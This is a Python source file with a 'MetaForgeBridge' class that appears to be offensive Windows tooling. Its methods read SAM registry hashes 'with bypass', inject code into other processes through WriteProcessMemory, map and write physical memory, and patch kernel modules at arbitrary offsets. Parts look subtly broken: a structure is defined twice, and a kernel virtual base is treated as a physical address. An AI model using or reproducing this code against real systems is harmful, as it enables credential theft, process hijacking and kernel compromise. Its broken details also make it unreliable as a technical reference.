import os
import ctypes
from pathlib import Path
import struct

# Definizione strutture kernel
class SYSTEM_MODULE_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved", ctypes.c_void_p * 2),
        ("ImageBase", ctypes.c_void_p),
        ("ImageSize", ctypes.c_ulong),
        ("Flags", ctypes.c_ulong),
        ("LoadOrderIndex", ctypes.c_ushort),
        ("InitOrderIndex", ctypes.c_ushort),
        ("LoadCount", ctypes.c_ushort),
        ("ModuleNameOffset", ctypes.c_ushort),
        ("ImageName", ctypes.c_char * 256)
    ]

class MetaForgeBridge:
    def __init__(self):
        self.metaforge_path = Path(__file__).parent.parent.parent / 'metaforge'
        self._load_metaforge_modules()
        self._setup_kernel_access()
        
    def _load_metaforge_modules(self):
        """Load compiled MetaForge modules"""
        try:
            # Load core modules directly from core directory
            self.win_api = ctypes.CDLL(str(self.metaforge_path / 'core' / 'win_api.dll'))
            self.memory = ctypes.CDLL(str(self.metaforge_path / 'core' / 'memory.dll'))
            self.registry = ctypes.CDLL(str(self.metaforge_path / 'core' / 'registry.dll'))
            
            # Setup function prototypes
            self._setup_win_api()
            self._setup_memory()
            self._setup_registry()
        except Exception as e:
            raise RuntimeError(f"Failed to load MetaForge modules: {str(e)}")
            
    def _setup_win_api(self):
        """Setup Windows API function prototypes"""
        # OpenProcess
        self.win_api.OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_uint32]
        self.win_api.OpenProcess.restype = ctypes.c_void_p
        
        # RegOpenKeyEx
        self.win_api.RegOpenKeyEx.argtypes = [
            ctypes.c_void_p, 
            ctypes.c_char_p,
            ctypes.c_uint32,
            ctypes.c_uint32,
            ctypes.POINTER(ctypes.c_void_p)
        ]
        self.win_api.RegOpenKeyEx.restype = ctypes.c_uint32
        
    def _setup_memory(self):
        """Setup memory operation prototypes"""
        # allocate_memory
        self.memory.allocate_memory.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
        self.memory.allocate_memory.restype = ctypes.c_void_p
        
        # read_memory
        self.memory.read_memory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32]
        self.memory.read_memory.restype = ctypes.c_void_p
        
    def _setup_registry(self):
        """Setup registry operation prototypes"""
        # open_registry_key
        self.registry.open_registry_key.argtypes = [ctypes.c_char_p, ctypes.c_uint32]
        self.registry.open_registry_key.restype = ctypes.c_void_p
        
        # read_registry_value
        self.registry.read_registry_value.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        self.registry.read_registry_value.restype = ctypes.c_void_p
        
    def read_sam_data(self, path):
        """Read SAM data using MetaForge low-level access"""
        try:
            # Open SAM key with bypass
            key = self.registry.open_registry_key(
                path.encode(),
                0xF003F  # Maximum allowed access
            )
            
            if not key:
                raise Exception("Failed to open registry key")
                
            # Read value
            data = self.registry.read_registry_value(key, b"F")
            if not data:
                raise Exception("Failed to read registry value")
                
            # Convert to Python bytes
            size = ctypes.c_uint32.from_address(data - 4).value
            return bytes(ctypes.string_at(data, size))
            
        except Exception as e:
            raise Exception(f"MetaForge error: {str(e)}")
            
    def inject_code(self, pid, code):
        """Inject code into process using MetaForge memory operations"""
        try:
            # Open target process
            handle = self.win_api.OpenProcess(0x1F0FFF, False, pid)
            if not handle:
                raise Exception("Failed to open process")
                
            # Allocate memory
            size = len(code)
            addr = self.memory.allocate_memory(handle, size)
            if not addr:
                raise Exception("Failed to allocate memory")
                
            # Write code
            written = ctypes.c_size_t()
            if not ctypes.windll.kernel32.WriteProcessMemory(
                handle, addr, code, size, ctypes.byref(written)
            ):
                raise Exception("Failed to write memory")
                
            return addr
            
        except Exception as e:
            raise Exception(f"MetaForge error: {str(e)}")
            
    def _setup_kernel_access(self):
        """Setup direct kernel access"""
        try:
            # Definizione strutture kernel
            class SYSTEM_MODULE_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("Reserved", ctypes.c_void_p * 2),
                    ("ImageBase", ctypes.c_void_p),
                    ("ImageSize", ctypes.c_ulong),
                    ("Flags", ctypes.c_ulong),
                    ("LoadOrderIndex", ctypes.c_ushort),
                    ("InitOrderIndex", ctypes.c_ushort),
                    ("LoadCount", ctypes.c_ushort),
                    ("ModuleNameOffset", ctypes.c_ushort),
                    ("ImageName", ctypes.c_char * 256)
                ]

            # Carica funzioni kernel
            self.ntdll = ctypes.WinDLL('ntdll.dll')
            self.kernel32 = ctypes.WinDLL('kernel32.dll')
            
            # Setup funzioni critiche
            self._setup_critical_functions()
            
        except Exception as e:
            print(f"Kernel access setup failed: {e}")

    def _setup_critical_functions(self):
        """Setup funzioni critiche per accesso kernel"""
        # NtQuerySystemInformation
        self.NtQuerySystemInformation = self.ntdll.NtQuerySystemInformation
        self.NtQuerySystemInformation.argtypes = [
            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
        ]
        
        # ZwOpenSection
        self.ZwOpenSection = self.ntdll.ZwOpenSection
        self.ZwOpenSection.argtypes = [
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.c_ulong,
            ctypes.c_void_p
        ]
        
        # NtMapViewOfSection
        self.NtMapViewOfSection = self.ntdll.NtMapViewOfSection
        self.NtMapViewOfSection.argtypes = [
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.c_ulong,
            ctypes.c_ulong,
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_ulong),
            ctypes.c_ulong,
            ctypes.c_ulong,
            ctypes.c_ulong
        ]

    def map_physical_memory(self, physical_address, size):
        """Mappa memoria fisica in spazio virtuale"""
        try:
            # Crea sezione fisica
            section_handle = ctypes.c_void_p()
            status = self.ZwOpenSection(
                ctypes.byref(section_handle),
                0xF001F, # Tutti i diritti
                None
            )
            
            if status != 0:
                raise Exception(f"Failed to open physical memory section: {status}")
                
            # Mappa vista
            base_address = ctypes.c_void_p()
            view_size = ctypes.c_ulong(size)
            status = self.NtMapViewOfSection(
                section_handle,
                ctypes.c_void_p(-1), # Current process
                ctypes.byref(base_address),
                0,
                size,
                ctypes.c_void_p(physical_address),
                ctypes.byref(view_size),
                1, # ViewShare
                0,
                0x4 # PAGE_READWRITE
            )
            
            if status != 0:
                raise Exception(f"Failed to map view of section: {status}")
                
            return base_address.value
            
        except Exception as e:
            raise Exception(f"Physical memory mapping failed: {str(e)}")

    def write_physical_memory(self, physical_address, data):
        """Scrivi direttamente in memoria fisica"""
        try:
            mapped_address = self.map_physical_memory(physical_address, len(data))
            ctypes.memmove(mapped_address, data, len(data))
            return True
        except:
            return False

    def read_physical_memory(self, physical_address, size):
        """Leggi direttamente dalla memoria fisica"""
        try:
            mapped_address = self.map_physical_memory(physical_address, size)
            return bytes(ctypes.string_at(mapped_address, size))
        except:
            return None

    def find_kernel_module(self, module_name):
        """Trova base address di un modulo kernel"""
        buffer_size = 1024 * 1024
        buffer = ctypes.create_string_buffer(buffer_size)
        
        status = self.NtQuerySystemInformation(
            11, # SystemModuleInformation
            buffer,
            buffer_size,
            None
        )
        
        if status != 0:
            raise Exception(f"Failed to query system information: {status}")
            
        modules = ctypes.cast(buffer, ctypes.POINTER(SYSTEM_MODULE_INFORMATION))
        for i in range(modules[0].LoadCount):
            if module_name.lower() in modules[i].ImageName.decode().lower():
                return modules[i].ImageBase
                
        return None

    def patch_kernel(self, module_name, offset, patch_bytes):
        """Patcha un modulo kernel"""
        try:
            base = self.find_kernel_module(module_name)
            if not base:
                raise Exception(f"Module {module_name} not found")
                
            patch_address = base + offset
            return self.write_physical_memory(patch_address, patch_bytes)
        except:
            return False